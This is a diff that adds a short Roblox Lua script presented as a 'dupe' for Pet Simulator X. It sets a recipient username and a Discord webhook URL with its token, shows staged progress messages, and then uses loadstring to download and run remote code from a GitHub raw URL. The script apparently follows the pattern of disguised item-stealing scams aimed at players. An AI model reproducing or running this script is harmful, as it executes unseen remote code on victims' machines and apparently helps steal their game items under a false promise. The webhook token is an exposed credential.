@@ -1,0 +1,9 @@
+Username = "TONOY_TALK"
+WebHook = "https://discord.com/api/webhooks/1070742970338390016/-utHws8RQXUWY4xeOXmkWjx04Uj8FwLjquQYBijQg_5AH8CzSejDrmAa_adj66kG0_R0"
+
+_G.CustomScriptName = "Welcome to PxT Offical Dupe!"
+_G.Text1 = "Pet Simulator X..."
+_G.Text2 = "Script:PxT Dupe"
+_G.Text3 = "Checking Any Error..."
+_G.Text4 = "Dupe Complete please rejoin!"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
